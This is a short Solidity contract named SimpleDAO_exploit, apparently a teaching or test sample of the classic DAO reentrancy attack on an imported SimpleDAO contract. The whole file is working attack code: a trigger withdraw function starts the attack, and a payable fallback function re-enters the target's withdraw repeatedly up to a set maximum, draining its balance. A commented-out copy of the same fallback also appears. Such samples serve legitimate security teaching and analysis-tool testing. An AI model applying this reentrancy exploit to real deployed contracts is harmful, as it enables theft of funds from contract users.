//
pragma solidity >=0.4.24;

import "./SimpleDAO.sol";

contract SimpleDAO_exploit {

  SimpleDAO private dao;
  uint private amount;
  uint private count;
  uint private max;

  constructor () public { amount = 0; count = 0; max = 0;}

  function set_dao (address dao_addr) public {
    dao = SimpleDAO (dao_addr);
  }

  function set_max (uint _max) public {
    max = _max;
  }

  function donate (address to) payable public {
    // transfer msg.value from msg.sender to SimpleDAO
    dao.donate.value (msg.value)(to);
  }

  // trigger
  function withdraw (uint _amount) public {
    count = 0; amount = _amount;
    dao.withdraw (_amount);
  }

  // fallback function: called within dao.withdraw
  //  function () payable public {
  //    if (count < max) {
  //      count++;
  //      dao.withdraw (amount);
  //    }
  //  }

  function () payable external {
    if (count < max) {
      count++;
      dao.withdraw (amount);
    }
  }

}
